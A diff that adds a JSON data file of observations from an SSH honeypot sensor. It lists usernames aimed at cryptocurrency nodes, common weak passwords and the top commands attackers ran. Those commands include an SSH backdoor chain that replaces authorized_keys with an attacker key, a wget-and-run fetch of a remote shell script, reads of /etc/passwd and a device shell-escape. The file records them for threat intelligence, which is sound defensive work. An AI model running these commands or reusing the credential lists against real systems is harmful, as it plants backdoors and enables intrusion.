@@ -1,0 +1,29 @@
+{
+  "_comment": "Cowrie(SSHハニーポット)の実観測値。usernames は techoff-srv キャンペーンの暗号通貨ノード狙い+汎用。commands は prefetch の実 top_commands（recon連鎖と mdrfckr バックドア注入チェーンを含む）。",
+  "sensor": "tpot-sensor-01",
+  "usernames": ["root", "admin", "sol", "solana", "ethereum", "firedancer", "raydium", "helius", "validator", "solv", "solnode", "banx", "soltech", "tron", "avax", "cosmos", "bittensor", "ubuntu", "user", "test", "oracle", "postgres", "git", "deploy"],
+  "passwords": ["123456", "password", "root", "admin", "12345678", "1234", "qwerty", "P@ssw0rd", "solana123", "changeme", "toor", "ubuntu", "111111", "raydium2024", "letmein"],
+  "commands": [
+    "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+    "uname -a",
+    "cat /proc/cpuinfo | grep name | wc -l",
+    "whoami",
+    "cat /proc/cpuinfo | grep model | grep name | wc -l",
+    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+    "top",
+    "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+    "ls -lh $(which ls)",
+    "uname",
+    "which ls",
+    "crontab -l",
+    "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
+    "lscpu | grep Model",
+    "uname -m",
+    "cat /etc/passwd",
+    "id",
+    "cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rwl5Q==mdrfckr'>>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+    "wget http://0.0.0.0/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh",
+    "enable\nsystem\nshell\nsh",
+    "cat /proc/mounts; /ip cloud print"
+  ]
+}
